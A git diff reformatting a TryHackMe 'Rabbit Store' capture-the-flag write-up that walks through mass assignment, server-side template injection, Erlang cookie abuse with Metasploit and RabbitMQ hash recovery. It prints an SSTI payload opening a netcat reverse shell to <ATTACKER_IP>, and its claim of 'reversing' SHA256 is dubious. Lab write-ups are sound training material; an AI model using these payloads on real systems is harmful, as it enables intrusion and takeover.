@@ -1,14 +1,16 @@
 # Rabbit Store — TryHackMe Writeup
 
+### Lab Info
+```
 Platform: TryHackMe  
 Room: Rabbit Store  
 Difficulty: Medium  
 Target OS: Linux  
 Services: Apache, RabbitMQ, Erlang  
-
+```
 ---
 
-# 🧠 Overview
+## Overview
 
 This machine involved:
 
@@ -18,16 +20,20 @@ This machine involved:
 - Remote Code Execution (RCE)
 - RabbitMQ exploitation via Erlang cookie
 - Password hash extraction and decoding
+---
+## Tools Used
 
-Attack chain:
-
-Web App → Mass Assignment → SSTI → RCE → Erlang Cookie Abuse → RabbitMQ Access → Root
-
+- Nmap
+- Burp Suite
+- Netcat
+- Metasploit
+- CyberChef
+- JWT.io
 ---
 
-# 🔎 Enumeration
+## Enumeration
 
-## Nmap Scan
+### Nmap Scan
 
 ```bash
 nmap -sC -sV <IP>
@@ -37,182 +43,169 @@ Port	Service
 80	Apache 2.4.52
 4369	Erlang Port Mapper (epmd)
 25672	RabbitMQ Clustering
+```
+Website redirected to: `http://cloudsite.thm`
 
-Website redirected to:
+Login page: `http://storage.cloudsite.thm`
 
-http://cloudsite.thm
-
-Login page:
-
-http://storage.cloudsite.thm
-🌐 Web Enumeration
+### Web Enumeration
 
 Registered user:
-
+```
 admin@local.thm : admin
-
+```
 Access was restricted to internal users.
 
-🔐 JWT Analysis
+### JWT Analysis
 
 Extracted JWT from browser storage.
 
 Decoded using jwt.io and found:
-
+```
 "subscription": "inactive"
-
+```
 This suggested potential privilege manipulation.
 
-⚡ Mass Assignment Vulnerability
+### Mass Assignment Vulnerability
 
 Registered new user:
-
+```
 user@local.thm : user123
-
+```
 Intercepted request in Burp and added:
-
-"subscription": "active"
+`"subscription": "active"`
 
 User successfully registered as active.
+Gained access to file upload functionality.
 
-🎯 Gained access to file upload functionality.
-
-📂 File Upload Analysis
+### File Upload Analysis
 
 Direct upload stripped extensions (no RCE).
+However, another feature allowed to upload from URL
 
-However, another feature allowed:
+Downloading a file from:`/api/uploads/<uuid>`
 
-Upload from URL
+This revealed API documentation where I found hidden route:`/api/fetch_messages_from_chatbot`
 
-Downloading a file from:
+---
 
-/api/uploads/<uuid>
+## Server-Side Template Injection (SSTI)
 
-Revealed API documentation.
+GET request not allowed so I sent POST request as `Content-Type: application/json`
 
-Found hidden route:
+I got error saying: `username is required`
 
-/api/fetch_messages_from_chatbot
-💥 Server-Side Template Injection (SSTI)
-
-GET request not allowed.
-
-Sent POST request:
-
-Content-Type: application/json
-
-Error:
-
-username is required
-
-Tested SSTI:
-
+#### Tested SSTI:
+```
 {"username":"{{7*7}}"}
+```
+Response: `49`
 
-Response:
+This confirmed that there is SSTI vulnerability.
 
-49
-
-✅ Confirmed SSTI vulnerability.
-
-💣 Remote Code Execution
+---
+## Remote Code Execution
 
 Used payload:
-
+```
 {
 "username":"{{request.application.__globals__.__builtins__.eval('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 1337 >/tmp/f\").read()')}}"
 }
-
+```
 Started listener:
-
+```
 nc -lvnp 1337
+```
+#### Got reverse shell.
 
-🎯 Got reverse shell.
-
-🖥️ Shell Stabilization
+#### Shell Stabilization
+```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 CTRL + Z
 stty raw -echo; fg
 stty rows 38 columns 116
-🏁 User Flag
+```
+#### User Flag
 
-Location:
+Location:`/home/azrael/user.txt`
 
-/home/azrael/user.txt
+## RabbitMQ Enumeration
 
-🐇 RabbitMQ Enumeration
+RabbitMQ data directory: `/var/lib/rabbitmq/`
 
-RabbitMQ data directory:
+Found: `.erlang.cookie`
 
-/var/lib/rabbitmq/
+Cookie value: `r8jQC970pWBgtkSD`
 
-Found:
+---
+## Erlang Cookie Exploitation
 
-.erlang.cookie
-
-Cookie value:
-
-r8jQC970pWBgtkSD
-🚀 Erlang Cookie Exploitation
-
-Used Metasploit module:
-
+#### Used Metasploit module:
+```
 exploit/multi/misc/erlang_cookie_rce
-
-Configuration:
 
 set RHOSTS <target_ip>
 set RPORT 25672
 set COOKIE r8jQC970pWBgtkSD
 set LHOST <attacker_ip>
 run
-
-Gained shell as:
-
+```
+#### Gained shell as:
+```
 rabbitmq@forge
-🔧 RabbitMQ Enumeration
+```
+## RabbitMQ Enumeration
 
 Exported definitions:
-
+```
 rabbitmqctl export_definitions --node rabbit@forge thm.json
-
-Found root user password hash:
-
+```
+#### Found root user password hash:
+```
 "password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
-🔐 Understanding RabbitMQ Hashing
+```
+### Understanding RabbitMQ Hashing
 
-RabbitMQ uses:
+RabbitMQ uses: `rabbit_password_hashing_sha256`
 
-rabbit_password_hashing_sha256
-
-Structure:
-
-Base64(SALT + SHA256(SALT + password))
+Structure: `Base64(SALT + SHA256(SALT + password))`
 
 The first 8 bytes represent the salt.
 
-🧩 Recovering Root Password
+### Recovering Root Password
 
 Steps:
 
-Decode Base64
-Remove first 8 bytes (salt)
-Reverse SHA256 logic
-Used CyberChef to analyze structure.
-Recovered root credentials.
+- Decode Base64
+- Remove first 8 bytes (salt)
+- Reverse SHA256 logic
+- Used CyberChef to analyze structure.
+- Recovered root credentials.
 
-🏆 Root Flag
+## Root Flag
 
 After logging in as root:
-
+```
 ls -la
 cat root.txt
+FLAG{...}
+```
+---
+## Attack Chain Summary
 
-🎯 Root flag obtained.
-
-📌 Key Takeaways
+- Enumerated web app
+- Modified JWT subscription flag
+- Exploited mass assignment
+- Discovered hidden API endpoint
+- Exploited SSTI → RCE
+- Extracted Erlang cookie
+- Used Metasploit Erlang RCE
+- Dumped RabbitMQ definitions
+- Recovered root password
+- Retrieved root flag
+---
+## Key Takeaways
 
 JWT manipulation often reveals privilege escalation paths.
 Mass assignment vulnerabilities are extremely dangerous.
@@ -221,24 +214,6 @@ Always inspect /var/lib/rabbitmq/.
 Erlang cookies allow full cluster access.
 RabbitMQ password hashing includes salt prefix.
 
-🛠️ Tools Used
 
-Nmap
-Burp Suite
-Netcat
-Metasploit
-CyberChef
-JWT.io
 
-🔥 Attack Chain Summary
 
-Enumerated web app
-Modified JWT subscription flag
-Exploited mass assignment
-Discovered hidden API endpoint
-Exploited SSTI → RCE
-Extracted Erlang cookie
-Used Metasploit Erlang RCE
-Dumped RabbitMQ definitions
-Recovered root password
-Retrieved root flag
